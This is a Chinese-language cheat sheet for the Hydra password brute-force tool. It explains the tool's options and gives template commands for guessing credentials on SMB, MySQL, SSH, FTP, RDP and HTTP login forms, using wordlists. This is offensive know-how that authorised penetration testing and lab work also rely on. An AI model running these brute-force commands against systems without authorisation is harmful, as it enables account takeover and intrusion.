# hydra-密码爆破工具

## [官网](https://github.com/vanhauser-thc/thc-hydra)



## 基础参数

```md
-l LOGIN 指定破解的用户名称，对特定用户破解。
-L FILE 从文件中加载用户名进行破解。
-p PASS小写p指定密码破解，少用，一般是采用密码字典。
-P FILE 大写字母P，指定密码字典。
-e nsr 可选选项，n：空密码试探，s：使用指定用户和密码试探，r：指定密码与用户名相反。
-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。
-t TASKS 同时运行的连接的线程数，每一台主机默认为16。
-M FILE 指定服务器目标列表文件一行一条
-w TIME 设置最大超时的时间，单位秒，默认是30s。
-o FILE 指定结果输出文件。
-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
-v / -V 显示详细过程。
-R 继续从上一次进度接着破解。
-S 采用SSL链接。
-s PORT 可通过这个参数指定非默认端口。
-U       服务模块使用细节
-h       更多的命令行选项（完整的帮助）
server  目标服务器名称或者IP（使用这个或-M选项）
service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
OPT       一些服务模块支持额外的输入（-U用于模块的帮助）
```

## 常用操作

```md
hydra -l 用户名 -p 密码 smb://ip –v  //windows密码破解
hydra -l 用户名 -p 密码 smb ip –v //-v //显示爆破详细信息
hydra -L user.txt -P pass.txt ip mysql    //MySQL密码破解
hydra -L user.txt -P pass.txt mysql:      //目标IP:mysql端口号
hydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh    //ssh密码破解
hydra -l 用户名 -P 密码字典 -t 线程 -o save.log -vV ip ssh    //ssh密码破解
hydra ip ftp -l 用户名 -P 密码字典 -t 线程数(默认16) -s 指定端口 –vV    //ftp密码破解
hydra ip rdp -l administrator -P pass.txt –V    //rdp破解   不支持就升级下apt install hydra
hydra -m /index.php -l muts -P pass.txt ip https    //https破解
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /web/  //get方式的https破解
hydra -l admin -P small.txt 域名/ip -s 端口 http-post-form "/Pass-09/index.php:username=^USER^&password=^PASS^&Login=Login:F=密码错误" -v    //post方式的https破解
```
